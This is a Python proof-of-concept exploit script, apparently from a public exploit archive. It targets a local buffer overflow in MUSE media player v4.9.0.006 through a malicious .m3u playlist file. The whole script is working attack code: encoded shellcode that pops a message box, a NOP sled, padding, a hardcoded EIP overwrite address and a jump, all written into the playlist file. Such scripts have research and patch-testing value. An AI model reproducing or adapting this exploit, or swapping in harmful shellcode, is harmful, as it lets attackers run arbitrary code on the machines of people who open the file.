# Exploit Title: MUSE v4.9.0.006 (.m3u) Local Buffer Overflow Exploit
# Date: August 17, 2010
# Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
# Software Link: http://download.cnet.com/MUSE/3000-2140_4-42511.html
# Version: 4.9.0.006
# Tested on: Windows XP SP3 En

buffersize = 205
nopsled = "\x90" * 4
# Custom MessageBox
# x86/shikata_ga_nai succeeded with size 104 (iteration=1)
shellcode = ("\xd9\xe5\x29\xc9\xbe\xe0\xc8\xa6\x9f\xb1\x14\xd9\x74\x24\xf4"
"\x5f\x83\xc7\x04\x31\x77\x14\x03\x77\xf4\x2a\x53\xf7\x8c\x8a"
"\xbc\x08\x04\xac\xd9\x4a\xbb\x5a\x47\x38\x30\xfa\xef\xd1\xdb"
"\xdc\xa2\x45\x60\x68\x4e\xe2\xef\x71\xd8\x6f\x8b\x54\x19\x18"
"\x36\xf4\x6c\xac\xd0\x9f\xae\x09\x58\x08\xc3\xf2\xf7\xac\x73"
"\xa6\x6f\x48\xe8\xc1\x8e\xa3\x30\x81\x03\x95\xe0\x98\x49\x12"
"\x44\xa3\x72\xcf\x77\x9b\xdc\x48\x65\xd0\x5d\xd4\x75\x36")

junk = "\x90" * (buffersize-(len(nopsled)+len(shellcode)))
njump = "\xe9\x29\xff\xff\xff"
eip = "\x53\x93\x42\x7e"

payload = nopsled+shellcode+junk+eip+nopsled+njump

try:
    print "[+] Creating exploit file.."
    exploit = open('muse.m3u','w');
    exploit.write(payload);
    exploit.close();
    print "[+] Writing", len(payload), "bytes to muse.m3u"
    print "[+] Exploit file created!"
except:
    print "[-] Error: You do not have correct permissions.."

